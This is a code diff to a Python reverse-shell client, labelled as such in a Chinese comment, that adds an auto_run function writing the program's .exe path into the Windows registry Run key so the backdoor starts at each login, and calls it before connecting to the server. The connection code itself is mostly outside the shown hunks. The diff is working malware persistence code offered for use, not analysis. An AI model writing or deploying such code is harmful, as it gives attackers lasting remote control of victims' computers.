@@ -1,6 +1,9 @@
-import socket
-import time
 import os
+import sys
+import time
+import socket
+import win32api
+import win32con
 
 #反弹shell客户端
 
@@ -14,7 +17,23 @@ def connect_server():
         
     return s
 
+def auto_run():
+    try:
+        file_names = os.path.basename(__file__)     # 当前文件名的名称如：newsxiao.py
+        name = os.path.splitext(file_names)[0]      # 获得文件名的前部分,如：newsxiao
+        
+        path = os.path.abspath(os.path.dirname(__file__))+'\\'+name+'.exe' # 要添加的exe完整路径如：
+        print(path)
+        KeyName = 'Software\\Microsoft\\Windows\\CurrentVersion\\Run'
+        key = win32api.RegOpenKey(win32con.HKEY_CURRENT_USER,  KeyName, 0,  win32con.KEY_ALL_ACCESS)
+        win32api.RegSetValueEx(key, name, 0, win32con.REG_SZ, path)
+        win32api.RegCloseKey(key)
+    except:
+        print('添加启动项失败')
+    print('添加启动项成功！')
+
 if __name__ == '__main__':
+    auto_run()
     s = connect_server()
     while True:
         try:
